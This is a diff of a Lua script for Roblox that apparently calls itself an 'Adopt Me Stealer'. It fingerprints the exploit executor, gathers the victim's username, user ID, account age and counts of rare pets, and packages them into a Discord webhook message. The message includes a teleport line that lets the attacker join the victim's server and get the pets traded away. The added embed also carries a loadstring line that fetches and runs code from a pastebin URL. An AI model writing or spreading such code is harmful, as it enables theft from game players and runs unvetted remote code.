@@ -44,7 +44,7 @@ local function getexploit()
         (isvm and "Proxo") or
         (shadow_env and "Shadow") or
         (jit and "EasyExploits") or
-        (getscriptenvs and "Calamari") or
+        (getscriptenvs and "Codex/Unknown") or
         (unit and not syn and "Unit") or
         (OXYGEN_LOADED and "Oxygen U") or
         (IsElectron and "Electron") or
@@ -59,12 +59,18 @@ local accage = game.Players.LocalPlayer.AccountAge
 local data = {
   username = 'Pethical | Adopt Me Stealer!!',
   avatar_url = 'https://cdn.discordapp.com/attachments/1295330912900223039/1296364145406509056/standard_3.gif?ex=671204b1&is=6710b331&hm=995afe10858ed42f3ab62edd76e9c71de4fbbf8120bb1450c963cceff22483fd&',
-  content = '@everyone Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
+  content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
   embeds = {
     {
-      title = 'Pethical | Skidtho 👑',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
-      color = 10428396
+      title = 'Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = ".. tostring(plr) .."\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
+      color = 10428396,
+      fields = {
+                {
+                name = "🎮Auto Joiner",
+                value = "**COMMING SOON!**"
+                }
+      }
     }
   }
 }
